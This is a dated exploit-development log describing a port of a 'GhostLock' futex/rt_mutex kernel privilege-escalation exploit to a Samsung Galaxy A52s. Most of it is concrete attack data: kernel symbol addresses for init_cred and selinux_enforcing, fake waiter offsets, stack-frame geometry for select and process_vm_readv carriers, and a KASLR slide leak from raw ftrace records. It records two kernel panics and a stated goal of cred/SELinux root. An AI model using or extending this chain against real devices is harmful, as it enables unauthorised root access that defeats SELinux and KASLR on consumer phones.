# A52 GhostLock arm64 port — first attempt (2026-11-21)

- **Device:** Galaxy A52s 5G `SM-A528B`, kernel
  `5.4.254-qgki-28575149-abA528BXXSBGYI3`, Android 14, Enforcing
- **Upstream source:** [Huawei P50 Pro GhostLock 5.4 arm64 port](https://github.com/anVzdGFtb25/GhostLock-P50Pro-JAD-AL00)
  (Apache-2.0), derived from Honor 80 GT/OnePlus GhostLock.
- **A52 target:** [a52-target.h](../../research/a52-chain/ghostlock/a52-target.h)
- **Result:** the exploit builds and starts on the A52, but the MCAST carrier
  fails; no root, no panic.

## What was adapted

The P50 port and A52 share:

```text
KIMAGE_TEXT_BASE  0xffffffc010080000
KIMAGE_STEXT_LINK 0xffffffc010081000
WAITER_TASK_OFF   0x30
WAITER_LOCK_OFF   0x38
WAITER_PRIO_OFF   0x40
WAITER_DEADLINE_OFF 0x48
```

A52 stock addresses used in the target:

```text
init_task          0xffffffc012d24480
init_cred          0xffffffc012687c78
selinux_enforcing  0xffffffc0130c8c54
selinux_state      0xffffffc012f0d000
null_fops          0xffffffc012467708
random_table       0xffffffc012d94408
__schedule         0xffffffc01179ad40
do_futex           0xffffffc0103e473c
__arm64_sys_futex  0xffffffc0103e8010
task cred/real_cred 0x800/0x808
task comm          0x818
```

The binary is a static aarch64 build compiled with the A52 target header and
runs from `shell`:

```text
startup pid=... uid=2000 attr=u:r:shell:s0 enforce=1
perf-kaslr base=ffffffc010081000 slide=0000000000000000
```

## KASLR observation

`perf_event_open` is denied to the A52 shell/app, so the port used
`--kaslr-base=KIMAGE_STEXT_LINK` (the no-KASLR assumption).

A raw `sched_blocked_reason` trace record captured from
`/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw` contained a kernel text
pointer `0xffffffc0109a4158`, which is the static `_text` address range; this
is consistent with KASLR being off, but it is not yet a proof.

## Carrier findings

The P50 carrier uses `setsockopt(SOL_IP, MCAST_BLOCK_SOURCE=43, 0x108)` to
copy a fake `rt_mutex_waiter` onto the kernel stack. On the A52:

- `MCAST_JOIN_GROUP` (opt 42) for `224.0.0.1`/`wlan0` succeeds.
- `MCAST_BLOCK_SOURCE` with a **zero/fake waiter payload** returns
  `EADDRNOTAVAIL` (`errno=99`). A plain buffer succeeds, so A52 validates the
  source storage more strictly than the Huawei 5.4.86 carrier path.
- `MCAST_MSFILTER` (opt 48) succeeds even with fake waiter bytes, but its
  `do_ip_setsockopt` path uses `kmalloc`, not a kernel-stack copy, so it does
  not plant the waiter.
- The block-source error appears to happen **after** its stack copy, so the
  carrier may still be usable if the error is ignored and the offset is
  correct.

## Full write attempt

With the link-time base (`--kaslr-base=KIMAGE_STEXT_LINK`) and the carrier
path, the full pointer-write test **panicked the A52**:

```text
slide carrier join ifindex=35 ret=0 errno=0
slide child requeue ret=-1 errno=35
slide child carrier_done=1
<adb lost>
```

After recovery:

```text
ro.boot.bootreason=kernel_panic,bug
boot_id=2ca26741-da5f-4ff6-992e-846bdcbd020e
```

The phone recovered and booted normally. This proves the write is reaching
kernel memory; the fake lock/waiter offset or KASLR assumption is wrong.

## Current state

No root. The next step is to fix the carrier copy offset / fake-lock target
and confirm the KASLR base before retrying the write.

## Next

1. Replace or adapt the MCAST carrier for A52 (pselect/select_stack or another
   stack-copy syscall), preserving the fake waiter offsets.
2. Fix the boot_id `ctl_table` address; the binary currently reads
   `lo=b045... hi=67bb...` instead of the real boot id.
3. Then retry the pointer/leaf write tests, followed by cred/SELinux root.

No root; no completion.

## 2026-11-21 follow-up: carrier geometry

A52 `do_ip_setsockopt` uses `memdup_user` for both
`MCAST_BLOCK_SOURCE` and `MCAST_MSFILTER`, so neither option plants the fake
waiter on the kernel stack. The `EADDRNOTAVAIL` / heap paths are therefore
not usable as the P50 carrier.

Relevant A52 stack geometry from the stock Image:

```text
futex_wait_requeue_pi frame  0x1a0, waiter at sp+0x98  ->  top-0x198
__arm64_sys_futex frame      0x70
do_futex frame               0x20

__arm64_sys_select frame     0x80
core_sys_select frame        0x1c0, stack_fds at sp+0x50 (nfds <= 320)
                            -> stack_fds top-0x1f0
                            -> waiter at stack_fds+0x58; max copied fd_sets
                               0x78 (nfds=320), so task/lock are outside

__arm64_compat_sys_select    0x70; compat stack_fds -> waiter +0x48,
                            still task/lock outside the 0x78 copy

__arm64_sys_pselect6         0x10 + __do_sys_pselect6 0x90
                            -> stack_fds top-0x210; waiter +0x78

__arm64_sys_process_vm_readv 0x10 + process_vm_rw 0x180
                            -> iovstack at top-0x190, 8 bytes above the
                               futex waiter; covers waiter+0x8.., including
                               task/lock, but not tree.rb_parent_color
```

The promising next carrier is a two-syscall stack overlay:

1. `select(320, ...)` writes the waiter's tree fields at `stack_fds+0x58`.
2. `process_vm_readv` / `process_vm_writev` copies a 128-byte iovec array
   at `top-0x190`, covering waiter+0x8 through task/lock/prio.

The iovec path validates entries after the copy, so the fake bytes may be
corrupted or rejected; this needs a standalone test before another full
write attempt. No root; phone healthy.

## process_vm stack-overlay attempt

Implemented the two-syscall idea as a process_vm_rw-only overlay. The
`process_vm_rw` frame is 0x180 with its 8-entry iovec copy at
`top-0x190`; this covers the futex waiter at `top-0x198` from +0x8 onward,
including task/lock/prio, but leaves `tree.rb_parent_color` at +0x0
untouched.

`--noconsume` runs cleanly and reports `carrier=0/0`, so the copy and syscall
sequence are accepted. The full pointer-write test then panicked the A52:

```text
slide child requeue ret=-1 errno=35
slide child carrier_done=1
slide attempt 1 timed out waiting for child
<adb lost>
```

After recovery:

```text
ro.boot.bootreason=kernel_panic,bug
boot_id=5357412a-f4df-4888-ad53-8f33442c4d77
```

The missing `tree.rb_parent_color` word and/or the unresolved KASLR base is
still wrong. No root; phone recovered.

## KASLR leak from raw sched trace

A raw `sched_blocked_reason` record contains the caller address at event
offset +16.  Correlating the raw records with the text trace shows:

```text
raw caller        0xffffffc0109fc158
text caller       rpmh_write_batch+0x27c/0x2d8
static symbol     0xffffffc01096bedc
static caller     0xffffffc01096c158
difference        0x90000
```

The same difference appears for the current boot's other event callers, so
the runtime slide is **0x90000**, not zero:

```text
runtime _stext = 0xffffffc010081000 + 0x90000
               = 0xffffffc010111000
```

The write test with `--kaslr-base=0xffffffc010111000` no longer panics; it
reaches the carrier and times out because the fake waiter is incomplete.
This explains the earlier panics at `--kaslr-base=KIMAGE_STEXT_LINK`.

The KASLR slide changes per boot; the chain needs to re-derive it from the
raw ftrace caller before every run.
